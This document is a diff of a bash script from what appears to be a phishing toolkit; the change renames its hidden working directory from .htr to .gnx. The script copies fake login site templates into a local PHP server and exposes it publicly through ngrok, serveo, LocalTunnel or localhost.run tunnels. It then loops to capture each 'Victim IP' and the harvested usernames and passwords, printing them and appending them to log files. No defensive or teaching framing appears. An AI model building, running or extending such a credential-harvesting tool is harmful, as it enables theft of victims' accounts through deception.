@@ -44,7 +44,7 @@ command -v curl > /dev/null 2>&1 || { printf "\n\e[0m\e[96m Packages are not Ins
 command -v ssh > /dev/null 2>&1 || { printf "\n\e[0m\e[96m Packages are not Installed ! type \e[0m\e[93mbash setup\e[0m\n\n"; exit 1; }
 command -v unzip > /dev/null 2>&1 || { printf "\n\e[0m\e[96m Packages are not Installed ! type \e[0m\e[93mbash setup\e[0m\n\n"; exit 1; }
 
-if [[ -d .htr ]]; then
+if [[ -d .gnx ]]; then
 printf ""
 else
 printf "\n\e[0m\e[96m Packages are not Found ! type \e[0m\e[93mbash install.sh\e[0m\n\n"
@@ -58,11 +58,11 @@ printf "\n\e[0m\e[96m Packages are not Found ! type \e[0m\e[93mbash install.sh\e
 exit 1 
 fi
 
-if [[ -d .htr/www ]]; then
-rm -rf .htr/www
-mkdir .htr/www
+if [[ -d .gnx/www ]]; then
+rm -rf .gnx/www
+mkdir .gnx/www
 else
-mkdir .htr/www
+mkdir .gnx/www
 fi
 
 }
@@ -414,15 +414,15 @@ if [[ -e .nexlink ]]; then
 rm -rf .nexlink
 fi
 
-if [[ -d .htr/www ]]; then
-rm -rf .htr/www
-mkdir .htr/www
+if [[ -d .gnx/www ]]; then
+rm -rf .gnx/www
+mkdir .gnx/www
 else
-mkdir .htr/www
+mkdir .gnx/www
 fi
 
-cp -rf .Modules/$website/* .htr/www
-cp -f .Modules/ip.php .htr/www/
+cp -rf .Modules/$website/* .gnx/www
+cp -f .Modules/ip.php .gnx/www/
 
 def_tunnel_menu="2"
 smallbanner
@@ -468,7 +468,7 @@ start_localhost() {
 printf "\e[0m\n"
 echo " ----------------------------------------->>>>>"|lolcat
 printf " \e[1;31m[\e[0m\e[1;77m/\e[0m\e[1;31m]\e[0m\e[1;92m      Initializing...\e[0m\e[1;92m( \e[0m\e[1;96mhttp://127.0.0.1:5555 \e[0m\e[1;92m)\e[0m\n"
-cd .htr/www && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
+cd .gnx/www && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
 echo " ----------------------------------------->>>>>"|lolcat
 sleep 2
 
@@ -511,9 +511,9 @@ printf " \e[1;31m[\e[0m\e[1;77m/\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m
 sleep 1
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m/\e[0m\e[1;31m]\e[0m\e[1;92m Launching Ngrok ...\e[0m\n"
-cd .htr/www && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
+cd .gnx/www && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
 sleep 2
-./.htr/ngrok http 127.0.0.1:5555 > /dev/null 2>&1 &
+./.gnx/ngrok http 127.0.0.1:5555 > /dev/null 2>&1 &
 sleep 7
 ngrok_link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 
@@ -577,7 +577,7 @@ printf "\e[0m           \e[38;5;25;48;5;25m                         \e[0m       
 printf "\e[0m                                                   \e[0m\n"
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Serveo ...\e[0m\n"
-cd .htr/www && php -S 127.0.0.1:$serveo_port > /dev/null 2>&1 & 
+cd .gnx/www && php -S 127.0.0.1:$serveo_port > /dev/null 2>&1 & 
 if [[ $serveo_custom_subdomain == true ]]; then
 $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=60 -R %s:80:localhost:%s serveo.net > .nexlink 2> /dev/null &' $serveo_subdomain,$serveo_port
 sleep 7
@@ -618,15 +618,15 @@ printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m
 sleep 1
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching LocalTunnel ...\e[0m\n"
-cd .htr/www && php -S 127.0.0.1:4142 > /dev/null 2>&1 & 
+cd .gnx/www && php -S 127.0.0.1:4142 > /dev/null 2>&1 & 
 if [[ $loclx_custom_subdomain == true ]]; then
 
-./.htr/loclx tunnel http --to :4142 --subdomain $loclx_subdomain > .nexlink 2> /dev/null &
+./.gnx/loclx tunnel http --to :4142 --subdomain $loclx_subdomain > .nexlink 2> /dev/null &
 
 sleep 8
 
 else
-./.htr/loclx tunnel http --to :4142 > .nexlink 2> /dev/null &
+./.gnx/loclx tunnel http --to :4142 > .nexlink 2> /dev/null &
 sleep 8
 fi
 loclx_link=$(grep -o 'https://[0-9a-z]*\.loclx.io ' .nexlink)
@@ -641,7 +641,7 @@ start_localhostrun() {
 
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching LocalHostRun ...\e[0m\n"
-cd .htr/www && php -S 127.0.0.1:4545 > /dev/null 2>&1 & 
+cd .gnx/www && php -S 127.0.0.1:4545 > /dev/null 2>&1 & 
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;91m ( \e[0m\e[1;96mhttp://127.0.0.1:4545\e[0m\e[1;91m )\e[0m\n"
 sleep 1
@@ -660,24 +660,24 @@ printf "\e[0m\n"
 while [ true ]; do
 
 
-if [[ -e ".htr/www/ip.txt" ]]; then
+if [[ -e ".gnx/www/ip.txt" ]]; then
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Ip of Victim Found !\e[0m\n"
 grab_ip
-rm -rf .htr/www/ip.txt
+rm -rf .gnx/www/ip.txt
 fi
 sleep 0.75
-if [[ -e ".htr/www/usernames.txt" ]]; then
-account=$(grep -o 'Username:.*' .htr/www/usernames.txt | cut -d " " -f2)
+if [[ -e ".gnx/www/usernames.txt" ]]; then
+account=$(grep -o 'Username:.*' .gnx/www/usernames.txt | cut -d " " -f2)
 IFS=$'\n'
-password=$(grep -o 'Pass:.*' .htr/www/usernames.txt | cut -d ":" -f2)
+password=$(grep -o 'Pass:.*' .gnx/www/usernames.txt | cut -d ":" -f2)
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Account:\e[0m\e[1;96m %s\n\e[0m" $account
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Password:\e[0m\e[1;96m %s\n\e[0m" $password
-cat .htr/www/usernames.txt >> logs/$website.log
+cat .gnx/www/usernames.txt >> logs/$website.log
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[0m\e[96m logs/%s.log\e[0m\n" $website
 printf "\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Press Ctrl + C to Exit\e[0m\n"
-rm -rf .htr/www/usernames.txt
+rm -rf .gnx/www/usernames.txt
 fi
 sleep 0.75
 
@@ -687,7 +687,7 @@ done
 
 grab_ip() {
 
-ip=$(grep -a 'IP:' .htr/www/ip.txt | cut -d " " -f2 | tr -d '\r')
+ip=$(grep -a 'IP:' .gnx/www/ip.txt | cut -d " " -f2 | tr -d '\r')
 IFS=$'\n'
 
 printf "\e[0m\n"
@@ -695,20 +695,20 @@ printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP:\e[0m\e[1;
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[0m\e[96m ip.txt\e[0m\n" $server
 printf "\n"
-cat .htr/www/ip.txt >> ip.txt
+cat .gnx/www/ip.txt >> ip.txt
 
 }
 
 grab_creds() {
 
-account=$(grep -o 'Username:.*' .htr/www/usernames.txt | cut -d " " -f2)
+account=$(grep -o 'Username:.*' .gnx/www/usernames.txt | cut -d " " -f2)
 IFS=$'\n'
-password=$(grep -o 'Pass:.*' .htr/www/usernames.txt | cut -d ":" -f2)
+password=$(grep -o 'Pass:.*' .gnx/www/usernames.txt | cut -d ":" -f2)
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Account:\e[0m\e[1;96m %s\n\e[0m" $account
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Password:\e[0m\e[1;96m %s\n\e[0m" $password
-cat .htr/www/usernames.txt >> logs/$website.log
+cat .gnx/www/usernames.txt >> logs/$website.log
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[0m\e[96m logs/%s.log\e[0m\n" $website
 printf "\n"
@@ -724,18 +724,18 @@ printf "\n"
 while [ true ]; do
 
 
-if [[ -e ".htr/www/ip.txt" ]]; then
+if [[ -e ".gnx/www/ip.txt" ]]; then
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m]\e[0m\e[1;92m Ip of Victim Found !\e[0m\n"
 grab_ip
-rm -rf .htr/www/ip.txt
+rm -rf .gnx/www/ip.txt
 fi
 sleep 0.75
-if [[ -e ".htr/www/usernames.txt" ]]; then
+if [[ -e ".gnx/www/usernames.txt" ]]; then
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m]\e[0m\e[1;92m Login info Found !!\e[0m\n"
 grab_creds
-rm -rf .htr/www/usernames.txt
+rm -rf .gnx/www/usernames.txt
 fi
 sleep 0.75
 
@@ -747,4 +747,5 @@ done
 banner
 reqs
 menu
+
 
